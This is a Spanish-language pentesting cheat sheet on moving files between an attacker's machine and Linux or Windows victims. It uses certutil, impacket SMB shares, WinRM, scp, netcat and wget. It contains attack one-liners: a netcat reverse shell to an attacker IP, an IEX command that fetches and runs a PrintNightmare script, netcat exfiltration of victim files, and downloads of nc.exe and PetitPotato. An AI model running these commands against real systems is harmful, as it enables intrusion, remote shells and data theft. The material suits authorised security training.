# Transferir archivos 

Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux #Certutil #Python #Impacket #Scp #IEX #Bitsadmin

[LOLBAS](https://lolbas-project.github.io/)
## Linux a Windows 

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Windows 

C:\Temp
C:\Windows\Temp                          
```

```bash 
# Atacante Linux
2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
3. ❯ python3 -m http.server 80          # Creamos un servidor 
4. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un server para tranferir el archivo a Windows
5. ❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un server para tranferir el archivo a Windows compartiendo el dir actual con 'pwd'
```

```bash 
# Victima Windows 

1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir

2. ❯ certutil -urlcache -f http://IP/nc.exe nc.exe      # Descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
	
3. ❯ certutil.exe -f -urlcache -split http://IP/nc.exe nc.exe   # Descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 

4. \\\\<IP>\smbFolder\nc.exe -e cmd <IP> 443        # Ejecutas una revershell con el binario 'Netcat'
 
5. ❯ copy \\❮IP❯\smbFolder\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
```

```bash
# Si tenemos una sesion con WinRM, podemos usar el siguiente comando en la maquina victima sin necesidad de crear un recurso compartido en nuestra maquina de atacante 
❯ upload /ruta/absoluta/maquina/atacante/file.exe 
❯ download C:\dir\file.zip  file.zip          # Pasar el archivo desde la maquina Windows a Linux con WinRM

❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
```

## Linux a Linux

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Linux 

/var/tmp 
/dev/shm
```

```bash
# Atacante Linux

1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
2. ❯ nc -nlvp 443 > file.zip            # Se hace esto para descargar un archivo de la maquina victima con Netcat
3. ❯ base64 -w 0 script.sh | xclip -sel clip      # Transferir un script cuando no existe nano, nvim, trasformamos a base64 y lo copiamos a la clipboard
```

```bash 
# Victima Linux

1. ❯ wget http://IP/payload.sh              # Para descargar el payload de la maquina Linux
2. ❯ nc IP 443 < File.zip                   # Para pasar un archivo a la maquina de atacante 
3. ❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos y guardamos 
```

## Compartir archivos en un SMB de Linux a Windows 

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2

❯ smbserver.py <FOLDERNAME> $(pwd)                 # Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
```

## Windows cmd a Linux 

```bash 
# En Windows
# En el 'cmd' de la maquina Windows debemos colocar estos comandos

1. ❯ scp -r File user@IP:dir/destino/            # Pasar una carpeta con muchos archivos a Linux
   ❯ scp file.exe user@IP:/dir/destino/          # Pasar un archivo en especifico a Linux

	# r = Recursivo
	# File = Nombre de la carpeta que contiene los archivos a pasar  
	# user = Usuario de la maquina Linux (Debemos conocer su passwd)
	# dir = Directorio en donde se colocara el archivo 

2. ❯ scp user@IP:/dir/destino/ .                 # Copiar un archivo que se encuentra en la maquina Linux a Windows    
3. ❯ python3 -m http.server 80                   # Creamos un servidor 
```

```bash 
# En linux
3. ❯ http://IP          # Ingresamos desde el navegador web, colocamos la IP que se esta compartiendo y descargamos el recurso  
```
## Certutil 

```bash 
# Codifica y decodifica archivos en base64 
❯ certutil -decode input.txt output.txt      # Decodificar un archivo 

❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe              # Descargar un archivo directamente desde la url y se coloca en una ruta especifica en la maquina victima 
```

## Bitsadmin  

```bash
❯ bitsadmin 
```
